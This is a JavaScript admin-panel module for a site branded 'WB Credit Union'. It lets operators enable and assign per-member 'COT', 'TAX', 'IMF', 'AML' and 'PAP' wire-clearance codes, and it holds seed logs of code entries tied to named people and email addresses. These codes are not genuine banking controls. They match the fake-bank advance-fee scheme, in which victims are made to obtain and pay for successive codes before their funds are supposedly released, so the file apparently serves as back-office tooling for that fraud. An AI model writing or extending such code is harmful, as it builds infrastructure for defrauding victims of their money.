/**
 * ============================================================================
 * WB CREDIT UNION - ADMIN WIRE TRANSFER CODE CONTROLLER (js/admin-transfer-codes.js)
 * ============================================================================
 * 
 * Manages institutional wire transfer clearance gates:
 * 1. Global Code Settings (COT, TAX, IMF, AML, PAP, OTP with threshold)
 * 2. User Code Assignment (Individual assignment, edit, toggle, removal)
 * 3. Bulk Code Assignment wizard for multiple members
 * 4. Code Verification Telemetry & Usage Audit History
 * ============================================================================
 */

import {
  showToast,
} from './supabase-config.js';
import {
  getAdminUsersList,
  saveAdminUsersList,
  getUserById,
  updateUser,
} from './admin-users.js';

const ADMIN_GLOBAL_CODES_KEY = 'wb_credit_union_global_codes_config';
const ADMIN_CODE_LOGS_KEY = 'wb_credit_union_code_usage_logs';

/* ----------------------------------------------------------------------------
 * 1. DEFAULT GLOBAL CODE SETTINGS
 * ---------------------------------------------------------------------------- */
const defaultGlobalCodes = {
  COT: {
    enabled: true,
    name: 'Cost of Transfer Code (COT)',
    description: 'Required for processing international clearing & foreign exchange wire transfer fees.',
    updatedBy: 'Chief Treasury Auditor',
    updatedAt: '2026-09-26 09:30:00',
    prefix: 'CT-',
  },
  TAX: {
    enabled: true,
    name: 'Tax Clearance Code (TAX)',
    description: 'Federal tax clearance verification for foreign capital outward remittances.',
    updatedBy: 'Chief Treasury Auditor',
    updatedAt: '2026-09-25 14:15:00',
    prefix: 'TX-',
  },
  IMF: {
    enabled: true,
    name: 'IMF Clearance Code (IMF)',
    description: 'International Monetary Fund regulatory compliance & sovereign debt clearance.',
    updatedBy: 'Chief Treasury Auditor',
    updatedAt: '2026-09-24 16:00:00',
    prefix: 'IMF-',
  },
  AML: {
    enabled: true,
    name: 'Anti-Money Laundering Code (AML)',
    description: 'AML/CFT compliance screening credential for high-value transactions exceeding $50k.',
    updatedBy: 'Chief Treasury Auditor',
    updatedAt: '2026-09-24 11:20:00',
    prefix: 'AML-',
  },
  PAP: {
    enabled: true,
    name: 'Permanent Access Code (PAP)',
    description: 'Final sovereign beneficiary identity clearance and anti-piracy verification token.',
    updatedBy: 'Chief Treasury Auditor',
    updatedAt: '2026-09-23 10:05:00',
    prefix: 'PAP-',
  },
  OTP: {
    enabled: true,
    name: 'Two-Factor Wire OTP Verification',
    description: 'Mandatory cryptographic One-Time Password sent via secure channel.',
    threshold: 10000,
    updatedBy: 'Chief Treasury Auditor',
    updatedAt: '2026-09-26 08:00:00',
  }
};

/* ----------------------------------------------------------------------------
 * 2. INITIAL SEED CODE USAGE LOGS
 * ---------------------------------------------------------------------------- */
const initialSeedCodeLogs = [
  {
    id: 'log-101',
    date: '2026-09-26 11:18:22',
    user: 'Miz Brymo',
    email: 'mizbrymo@gmail.com',
    codeType: 'COT',
    enteredCode: 'CT-78234',
    txRef: 'WB-SWIFT-99201',
    result: 'success',
    attempts: 1,
  },
  {
    id: 'log-102',
    date: '2026-09-26 11:19:05',
    user: 'Miz Brymo',
    email: 'mizbrymo@gmail.com',
    codeType: 'TAX',
    enteredCode: 'TX-99120',
    txRef: 'WB-SWIFT-99201',
    result: 'success',
    attempts: 1,
  },
  {
    id: 'log-103',
    date: '2026-09-26 08:35:10',
    user: 'Sterling Merchant Trading',
    email: 'treasury@sterlingmerchant.com',
    codeType: 'COT',
    enteredCode: 'CT-00000',
    txRef: 'WB-SWIFT-99203',
    result: 'failed',
    attempts: 3,
  },
  {
    id: 'log-104',
    date: '2026-09-25 14:30:00',
    user: 'Elena Rostova',
    email: 'elena.rostova@vanguardlogistics.ch',
    codeType: 'IMF',
    enteredCode: 'IMF-88129',
    txRef: 'WB-SWIFT-99202',
    result: 'success',
    attempts: 1,
  },
  {
    id: 'log-105',
    date: '2026-09-24 16:40:12',
    user: 'Dr. Chen Wei',
    email: 'chen.wei@singaporebiotech.sg',
    codeType: 'AML',
    enteredCode: 'AML-55120',
    txRef: 'FED-009182',
    result: 'success',
    attempts: 1,
  }
];

/* ----------------------------------------------------------------------------
 * 3. STORAGE GETTERS / SETTERS
 * ---------------------------------------------------------------------------- */
export function getGlobalCodeSettings() {
  const stored = localStorage.getItem(ADMIN_GLOBAL_CODES_KEY);
  if (stored) {
    try {
      return JSON.parse(stored);
    } catch {
      // Fallback
    }
  }
  localStorage.setItem(ADMIN_GLOBAL_CODES_KEY, JSON.stringify(defaultGlobalCodes));
  return defaultGlobalCodes;
}

export function saveGlobalCodeSettings(cfg) {
  localStorage.setItem(ADMIN_GLOBAL_CODES_KEY, JSON.stringify(cfg));
}

export function getCodeUsageLogs() {
  const stored = localStorage.getItem(ADMIN_CODE_LOGS_KEY);
  if (stored) {
    try {
      return JSON.parse(stored);
    } catch {
      // Fallback
    }
  }
  localStorage.setItem(ADMIN_CODE_LOGS_KEY, JSON.stringify(initialSeedCodeLogs));
  return initialSeedCodeLogs;
}

export function saveCodeUsageLogs(logs) {
  localStorage.setItem(ADMIN_CODE_LOGS_KEY, JSON.stringify(logs));
}

export function generateRandomCode(codeType) {
  const prefixes = {
    COT: 'CT-',
    TAX: 'TX-',
    IMF: 'IMF-',
    AML: 'AML-',
    PAP: 'PAP-',
  };
  const prefix = prefixes[codeType] || 'CD-';
  const num = Math.floor(10000 + Math.random() * 90000);
  return `${prefix}${num}`;
}

/* ----------------------------------------------------------------------------
 * 4. INITIALIZATION
 * ---------------------------------------------------------------------------- */
let selectedAssignmentUserId = null;
let currentCodeLogs = [];

export function initAdminTransferCodes() {
  currentCodeLogs = getCodeUsageLogs();

  renderGlobalCodeCards();
  setupGlobalActionButtons();
  setupUserSearchForCodes();
  setupCodeModals();
  setupBulkCodeAssignmentModal();
  renderCodeUsageLogs();
}

/* ----------------------------------------------------------------------------
 * 5. SECTION 1: GLOBAL CODE CARDS & SWITCHES
 * ---------------------------------------------------------------------------- */
function renderGlobalCodeCards() {
  const container = document.getElementById('globalCodeSettingsGrid');
  if (!container) return;

  const config = getGlobalCodeSettings();
  const codeKeys = ['COT', 'TAX', 'IMF', 'AML', 'PAP', 'OTP'];

  container.innerHTML = codeKeys.map((key) => {
    const item = config[key];
    const isOtp = key === 'OTP';

    return `
      <div class="admin-code-card ${item.enabled ? 'active' : 'inactive'}" id="codeCard_${key}">
        <div class="d-flex justify-between items-start mb-3">
          <div>
            <div class="d-flex items-center gap-2">
              <span class="font-bold text-white text-md">${escapeHtml(item.name)}</span>
              <span class="action-chip ${item.enabled ? 'action-chip-approve' : 'action-chip-flag'}" id="codeStatusBadge_${key}">
                ${item.enabled ? '🟢 Active' : '🔴 Inactive'}
              </span>
            </div>
            <p class="text-xs text-muted mb-0 mt-1">${escapeHtml(item.description)}</p>
          </div>

          <!-- Large Obvious Toggle Switch -->
          <label class="admin-switch">
            <input type="checkbox" class="global-code-toggle" data-code-key="${key}" ${item.enabled ? 'checked' : ''} />
            <span class="admin-slider"></span>
          </label>
        </div>

        <div class="p-3 mb-2" style="background:#090d16; border-radius:8px; border:1px solid #334155;">
          <div class="text-xs font-semibold text-white mb-1">
            ${isOtp ? `Require 2FA OTP for wire transfers exceeding:` : `Enforcement Protocol:`}
          </div>
          
          ${isOtp ? `
            <div class="d-flex items-center gap-2">
              <span class="text-xs font-mono text-muted">$</span>
              <input type="number" id="otpThresholdInput" class="admin-form-control font-mono text-sm font-bold" style="width:140px; padding:0.35rem 0.65rem;" value="${item.threshold || 10000}" step="1000" />
              <span class="text-xs text-muted">USD (applies to international wires)</span>
            </div>
          ` : `
            <div class="text-xs text-muted">
              When <strong class="text-white">ON</strong>, all members must input their assigned ${key} code during the wire clearance wizard before funds leave treasury custody.
            </div>
          `}
        </div>

        <div class="d-flex justify-between items-center text-xs text-muted" style="font-size:0.6875rem;">
          <span>Last modified by: <strong class="text-white">${item.updatedBy || 'Chief Treasury Auditor'}</strong></span>
          <span class="font-mono">${item.updatedAt || 'Recent'}</span>
        </div>
      </div>
    `;
  }).join('');

  // Bind Switch Toggles
  container.querySelectorAll('.global-code-toggle').forEach((toggle) => {
    toggle.addEventListener('change', (e) => {
      const codeKey = toggle.getAttribute('data-code-key');
      const isChecked = e.target.checked;
      const currentConfig = getGlobalCodeSettings();

      currentConfig[codeKey].enabled = isChecked;
      currentConfig[codeKey].updatedAt = new Date().toISOString().replace('T', ' ').slice(0, 19);
      currentConfig[codeKey].updatedBy = 'Chief Treasury Auditor';

      if (codeKey === 'OTP') {
        const thresholdVal = parseFloat(document.getElementById('otpThresholdInput')?.value || '10000');
        currentConfig.OTP.threshold = thresholdVal;
      }

      saveGlobalCodeSettings(currentConfig);

      // Visual Card State update
      const card = document.getElementById(`codeCard_${codeKey}`);
      const badge = document.getElementById(`codeStatusBadge_${codeKey}`);
      if (card) {
        card.className = `admin-code-card ${isChecked ? 'active' : 'inactive'}`;
      }
      if (badge) {
        badge.className = `action-chip ${isChecked ? 'action-chip-approve' : 'action-chip-flag'}`;
        badge.textContent = isChecked ? '🟢 Active' : '🔴 Inactive';
      }

      showToast(`${codeKey} transfer gate ${isChecked ? 'ENABLED' : 'DISABLED'} globally.`, isChecked ? 'success' : 'warning', 'Global Setting Updated');
    });
  });

  // OTP threshold input watcher
  const otpInput = document.getElementById('otpThresholdInput');
  if (otpInput) {
    otpInput.addEventListener('change', () => {
      const currentConfig = getGlobalCodeSettings();
      currentConfig.OTP.threshold = parseFloat(otpInput.value || '10000');
      saveGlobalCodeSettings(currentConfig);
      showToast(`OTP threshold updated to $${currentConfig.OTP.threshold.toLocaleString()}`, 'info', 'OTP Limit');
    });
  }
}

function setupGlobalActionButtons() {
  const btnEnableAll = document.getElementById('btnEnableAllCodes');
  const btnDisableAll = document.getElementById('btnDisableAllCodes');
  const btnSaveSettings = document.getElementById('btnSaveCodeSettings');
  const btnResetDefaults = document.getElementById('btnResetCodeDefaults');

  if (btnEnableAll) {
    btnEnableAll.addEventListener('click', () => {
      const config = getGlobalCodeSettings();
      Object.keys(config).forEach((k) => { config[k].enabled = true; });
      saveGlobalCodeSettings(config);
      renderGlobalCodeCards();
      showToast('All 5 transfer clearance gates and OTP enabled globally.', 'success', 'All Codes Active');
    });
  }

  if (btnDisableAll) {
    btnDisableAll.addEventListener('click', () => {
      if (confirm('Warning: Disabling all clearance codes will allow wires to execute without multi-gate validation. Proceed?')) {
        const config = getGlobalCodeSettings();
        Object.keys(config).forEach((k) => { config[k].enabled = false; });
        saveGlobalCodeSettings(config);
        renderGlobalCodeCards();
        showToast('All clearance code gates deactivated.', 'warning', 'All Codes Inactive');
      }
    });
  }

  if (btnSaveSettings) {
    btnSaveSettings.addEventListener('click', () => {
      showToast('Global wire code configurations saved and synchronized with clearing nodes.', 'success', 'Saved');
    });
  }

  if (btnResetDefaults) {
    btnResetDefaults.addEventListener('click', () => {
      if (confirm('Reset all wire code configurations to institutional default settings?')) {
        saveGlobalCodeSettings(defaultGlobalCodes);
        renderGlobalCodeCards();
        showToast('Code configurations reset to default.', 'info', 'Reset Complete');
      }
    });
  }
}

/* ----------------------------------------------------------------------------
 * 6. SECTION 2: USER CODE ASSIGNMENT PANEL & SEARCH
 * ---------------------------------------------------------------------------- */
function setupUserSearchForCodes() {
  const searchInput = document.getElementById('userCodeSearchInput');
  const dropdown = document.getElementById('userCodeSearchResults');

  if (!searchInput || !dropdown) return;

  searchInput.addEventListener('input', () => {
    const query = searchInput.value.trim().toLowerCase();
    if (!query) {
      dropdown.style.display = 'none';
      return;
    }

    const users = getAdminUsersList();
    const matches = users.filter((u) =>
      u.fullName.toLowerCase().includes(query) ||
      u.email.toLowerCase().includes(query) ||
      u.accounts.some((a) => a.accountNumber.toLowerCase().includes(query))
    );

    if (matches.length === 0) {
      dropdown.innerHTML = '<div class="p-3 text-xs text-muted text-center">No matching members found.</div>';
      dropdown.style.display = 'block';
      return;
    }

    dropdown.innerHTML = matches.map((u) => `
      <div class="p-2 d-flex justify-between items-center user-search-result-item" data-user-id="${u.id}" style="cursor:pointer; border-bottom:1px solid rgba(51,65,85,0.4);">
        <div>
          <div class="font-bold text-white text-xs">${escapeHtml(u.fullName)}</div>
          <div class="text-xs text-muted font-mono">${escapeHtml(u.email)} • ${u.accounts[0]?.accountNumber || '9482-1049-55'}</div>
        </div>
        <span class="action-chip action-chip-approve">Select &rarr;</span>
      </div>
    `).join('');

    dropdown.style.display = 'block';

    dropdown.querySelectorAll('.user-search-result-item').forEach((item) => {
      item.onclick = () => {
        const uId = item.getAttribute('data-user-id');
        selectUserForCodeManagement(uId);
        dropdown.style.display = 'none';
        searchInput.value = '';
      };
    });
  });

  // Select first user by default on page load
  const users = getAdminUsersList();
  if (users.length > 0) {
    selectUserForCodeManagement(users[0].id);
  }
}

export function selectUserForCodeManagement(userId) {
  const user = getUserById(userId);
  if (!user) return;

  selectedAssignmentUserId = userId;
  const container = document.getElementById('userAssignedCodesContainer');
  const banner = document.getElementById('selectedUserBanner');
  if (!container || !banner) return;

  // Banner info
  banner.innerHTML = `
    <div class="d-flex items-center justify-between flex-wrap gap-2">
      <div class="d-flex items-center gap-3">
        <div class="admin-user-avatar" style="background:${user.avatarColor || '#3b82f6'}; width:40px; height:40px;">
          ${user.avatar || user.fullName.slice(0, 2).toUpperCase()}
        </div>
        <div>
          <div class="font-bold text-white text-sm">${escapeHtml(user.fullName)}</div>
          <div class="text-xs text-muted font-mono">${escapeHtml(user.email)} • Account: ${user.accounts[0]?.accountNumber || 'N/A'}</div>
        </div>
      </div>
      <div class="d-flex items-center gap-2">
        <span class="action-chip badge-status-${user.status}">${user.status.toUpperCase()}</span>
        <button class="admin-btn admin-btn-outline admin-btn-sm" id="btnRefreshUserCodes">🔄 Reload</button>
      </div>
    </div>
  `;

  // Codes rows
  const codeTypes = [
    { key: 'COT', label: 'COT Code (Cost of Transfer)' },
    { key: 'TAX', label: 'Tax Code (Tax Clearance Certificate)' },
    { key: 'IMF', label: 'IMF Code (IMF Regulatory Clearance)' },
    { key: 'AML', label: 'AML Code (Anti-Money Laundering Key)' },
    { key: 'PAP', label: 'PAP Code (Permanent Access Code)' }
  ];

  if (!user.wireTransferCodes) user.wireTransferCodes = {};

  container.innerHTML = codeTypes.map(({ key, label }) => {
    const codeObj = user.wireTransferCodes[key];
    const isSet = Boolean(codeObj && codeObj.code);
    const isActive = Boolean(codeObj && codeObj.active);

    return `
      <div class="admin-user-code-row">
        <div>
          <div class="font-bold text-white text-xs">${label}</div>
          <div class="text-xs text-muted">${codeObj?.notes || 'Standard clearing gate credential'}</div>
        </div>

        <div class="d-flex items-center gap-3">
          ${isSet ? `
            <div class="d-flex items-center gap-2">
              <span class="admin-code-value-chip">${codeObj.code}</span>
              <span class="action-chip ${isActive ? 'action-chip-approve' : 'action-chip-flag'}">
                ${isActive ? '✓ Active' : '✕ Inactive'}
              </span>
            </div>
            <div class="d-flex items-center gap-1">
              <button type="button" class="admin-btn admin-btn-outline admin-btn-sm btn-edit-user-code" data-code-key="${key}">Edit</button>
              <button type="button" class="admin-btn admin-btn-danger admin-btn-sm btn-remove-user-code" data-code-key="${key}">Remove</button>
            </div>
          ` : `
            <span class="text-xs text-muted italic mr-2">[Not Assigned]</span>
            <button type="button" class="admin-btn admin-btn-primary admin-btn-sm btn-assign-user-code" data-code-key="${key}">
              ➕ Assign Code
            </button>
          `}
        </div>
      </div>
    `;
  }).join('');

  // Bind Assign Buttons
  container.querySelectorAll('.btn-assign-user-code').forEach((btn) => {
    btn.onclick = () => {
      const codeKey = btn.getAttribute('data-code-key');
      openAssignCodeModal(user, codeKey);
    };
  });

  // Bind Edit Buttons
  container.querySelectorAll('.btn-edit-user-code').forEach((btn) => {
    btn.onclick = () => {
      const codeKey = btn.getAttribute('data-code-key');
      openEditCodeModal(user, codeKey);
    };
  });

  // Bind Remove Buttons
  container.querySelectorAll('.btn-remove-user-code').forEach((btn) => {
    btn.onclick = () => {
      const codeKey = btn.getAttribute('data-code-key');
      if (confirm(`Remove assigned ${codeKey} code for ${user.fullName}?`)) {
        delete user.wireTransferCodes[codeKey];
        updateUser(user);
        selectUserForCodeManagement(user.id);
        showToast(`${codeKey} code removed for ${user.fullName}.`, 'info', 'Code Cleared');
      }
    };
  });

  const refreshBtn = document.getElementById('btnRefreshUserCodes');
  if (refreshBtn) refreshBtn.onclick = () => selectUserForCodeManagement(userId);
}

/* ----------------------------------------------------------------------------
 * 7. ASSIGN & EDIT CODE MODALS
 * ---------------------------------------------------------------------------- */
function setupCodeModals() {
  const assignModal = document.getElementById('assignCodeModal');
  const editModal = document.getElementById('editCodeModal');
  const assignForm = document.getElementById('adminAssignCodeForm');
  const editForm = document.getElementById('adminEditCodeForm');

  // Auto-generate buttons
  const btnAutoGenerateAssign = document.getElementById('btnAutoGenerateAssign');
  if (btnAutoGenerateAssign) {
    btnAutoGenerateAssign.onclick = () => {
      const codeType = document.getElementById('assignCodeTypeSelect')?.value || 'COT';
      const input = document.getElementById('assignCodeValueInput');
      if (input) input.value = generateRandomCode(codeType);
    };
  }

  const btnAutoGenerateEdit = document.getElementById('btnAutoGenerateEdit');
  if (btnAutoGenerateEdit) {
    btnAutoGenerateEdit.onclick = () => {
      const codeType = document.getElementById('editCodeTypeHidden')?.value || 'COT';
      const input = document.getElementById('editCodeValueInput');
      if (input) input.value = generateRandomCode(codeType);
    };
  }

  // Assign Form Submit
  if (assignForm) {
    assignForm.addEventListener('submit', (e) => {
      e.preventDefault();
      if (!selectedAssignmentUserId) return;
      const user = getUserById(selectedAssignmentUserId);
      if (!user) return;

      const codeType = document.getElementById('assignCodeTypeSelect')?.value;
      const codeVal = document.getElementById('assignCodeValueInput')?.value.trim();
      const isActive = document.getElementById('assignCodeActiveToggle')?.checked;
      const notes = document.getElementById('assignCodeNotesInput')?.value.trim();

      if (!codeVal) {
        showToast('Code value is required.', 'error', 'Validation Error');
        return;
      }

      if (!user.wireTransferCodes) user.wireTransferCodes = {};
      user.wireTransferCodes[codeType] = {
        code: codeVal,
        active: isActive,
        notes: notes || `Assigned by Chief Treasury Auditor on ${new Date().toLocaleDateString()}`
      };

      user.activityLog.unshift({
        date: new Date().toISOString().replace('T', ' ').slice(0, 19),
        action: `Assigned ${codeType} code: ${codeVal} (${isActive ? 'Active' : 'Inactive'})`,
        ip: 'Admin Console',
        officer: 'Chief Treasury Auditor'
      });

      updateUser(user);
      selectUserForCodeManagement(user.id);
      assignModal.classList.remove('show');
      showToast(`${codeType} code "${codeVal}" assigned to ${user.fullName}.`, 'success', 'Code Assigned');
    });
  }

  // Edit Form Submit
  if (editForm) {
    editForm.addEventListener('submit', (e) => {
      e.preventDefault();
      if (!selectedAssignmentUserId) return;
      const user = getUserById(selectedAssignmentUserId);
      if (!user) return;

      const codeType = document.getElementById('editCodeTypeHidden')?.value;
      const codeVal = document.getElementById('editCodeValueInput')?.value.trim();
      const isActive = document.getElementById('editCodeActiveToggle')?.checked;
      const notes = document.getElementById('editCodeNotesInput')?.value.trim();

      if (!codeVal) {
        showToast('Code value is required.', 'error', 'Validation Error');
        return;
      }

      user.wireTransferCodes[codeType] = {
        code: codeVal,
        active: isActive,
        notes: notes || user.wireTransferCodes[codeType]?.notes || 'Updated by Auditor'
      };

      updateUser(user);
      selectUserForCodeManagement(user.id);
      editModal.classList.remove('show');
      showToast(`${codeType} code updated for ${user.fullName}.`, 'success', 'Code Updated');
    });
  }
}

function openAssignCodeModal(user, codeType) {
  const modal = document.getElementById('assignCodeModal');
  const typeSelect = document.getElementById('assignCodeTypeSelect');
  const valInput = document.getElementById('assignCodeValueInput');
  const userLabel = document.getElementById('assignCodeTargetUser');

  if (userLabel) userLabel.textContent = `${user.fullName} (${user.email})`;
  if (typeSelect) typeSelect.value = codeType;
  if (valInput) valInput.value = generateRandomCode(codeType);

  if (modal) modal.classList.add('show');
}

function openEditCodeModal(user, codeType) {
  const modal = document.getElementById('editCodeModal');
  const hiddenType = document.getElementById('editCodeTypeHidden');
  const typeDisplay = document.getElementById('editCodeTypeDisplay');
  const curValDisplay = document.getElementById('editCodeCurrentValDisplay');
  const valInput = document.getElementById('editCodeValueInput');
  const activeToggle = document.getElementById('editCodeActiveToggle');
  const notesInput = document.getElementById('editCodeNotesInput');

  const curObj = user.wireTransferCodes[codeType] || { code: '', active: true, notes: '' };

  if (hiddenType) hiddenType.value = codeType;
  if (typeDisplay) typeDisplay.textContent = `${codeType} Code`;
  if (curValDisplay) curValDisplay.textContent = curObj.code || 'None';
  if (valInput) valInput.value = curObj.code || generateRandomCode(codeType);
  if (activeToggle) activeToggle.checked = curObj.active !== false;
  if (notesInput) notesInput.value = curObj.notes || '';

  if (modal) modal.classList.add('show');
}

/* ----------------------------------------------------------------------------
 * 8. BULK CODE ASSIGNMENT
 * ---------------------------------------------------------------------------- */
function setupBulkCodeAssignmentModal() {
  const modal = document.getElementById('bulkCodeAssignModal');
  const openBtn = document.getElementById('btnOpenBulkCodeAssignModal');
  const form = document.getElementById('adminBulkCodeAssignForm');
  const userListContainer = document.getElementById('bulkCodeUserList');

  if (openBtn && modal) {
    openBtn.addEventListener('click', () => {
      populateBulkUsers();
      modal.classList.add('show');
    });
  }

  function populateBulkUsers() {
    if (!userListContainer) return;
    const users = getAdminUsersList();
    userListContainer.innerHTML = users.map((u) => `
      <label class="d-flex items-center justify-between p-2 mb-1" style="background:#090d16; border-radius:6px; cursor:pointer;">
        <div class="d-flex items-center gap-2">
          <input type="checkbox" class="bulk-user-cb" value="${u.id}" checked />
          <span class="text-xs text-white font-semibold">${escapeHtml(u.fullName)}</span>
          <span class="text-xs text-muted font-mono">(${escapeHtml(u.email)})</span>
        </div>
        <span class="text-xs font-mono text-muted">${u.accounts[0]?.accountNumber || 'N/A'}</span>
      </label>
    `).join('');
  }

  if (form) {
    form.addEventListener('submit', (e) => {
      e.preventDefault();
      const codeType = document.getElementById('bulkCodeTypeSelect')?.value || 'COT';
      const assignMode = document.querySelector('input[name="bulkAssignMode"]:checked')?.value || 'unique';
      const manualVal = document.getElementById('bulkCodeManualValue')?.value.trim();

      const checkedIds = Array.from(document.querySelectorAll('.bulk-user-cb:checked')).map((cb) => cb.value);
      if (checkedIds.length === 0) {
        showToast('Please select at least one member.', 'warning', 'Selection Required');
        return;
      }

      const users = getAdminUsersList();
      let count = 0;

      users.forEach((u) => {
        if (checkedIds.includes(u.id)) {
          if (!u.wireTransferCodes) u.wireTransferCodes = {};
          const finalCode = assignMode === 'unique' ? generateRandomCode(codeType) : (manualVal || generateRandomCode(codeType));
          u.wireTransferCodes[codeType] = {
            code: finalCode,
            active: true,
            notes: `Bulk assigned on ${new Date().toLocaleDateString()}`
          };
          count++;
        }
      });

      saveAdminUsersList(users);
      if (selectedAssignmentUserId) selectUserForCodeManagement(selectedAssignmentUserId);
      modal.classList.remove('show');
      showToast(`Assigned ${codeType} codes to ${count} members.`, 'success', 'Bulk Assignment Complete');
    });
  }
}

/* ----------------------------------------------------------------------------
 * 9. CODE USAGE HISTORY & AUDIT LOG
 * ---------------------------------------------------------------------------- */
function renderCodeUsageLogs() {
  const tbody = document.getElementById('codeUsageLogsTableBody');
  if (!tbody) return;

  const logs = getCodeUsageLogs();

  tbody.innerHTML = logs.map((log) => `
    <tr>
      <td class="font-mono text-xs text-muted">${log.date}</td>
      <td>
        <div class="font-bold text-white text-xs">${escapeHtml(log.user)}</div>
        <div class="text-xs text-muted font-mono">${escapeHtml(log.email)}</div>
      </td>
      <td>
        <span class="action-chip" style="background:rgba(59,130,246,0.2); color:#60a5fa;">${log.codeType}</span>
      </td>
      <td>
        <span class="font-mono text-xs text-white font-bold">${log.enteredCode}</span>
      </td>
      <td>
        <span class="font-mono text-xs text-muted">${log.txRef}</span>
      </td>
      <td>
        <span class="action-chip ${log.result === 'success' ? 'action-chip-approve' : 'action-chip-flag'}">
          ${log.result === 'success' ? '✓ Passed' : '✕ Failed'}
        </span>
      </td>
      <td class="text-right font-mono text-xs text-white">
        ${log.attempts} attempt${log.attempts > 1 ? 's' : ''}
      </td>
    </tr>
  `).join('');
}

function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
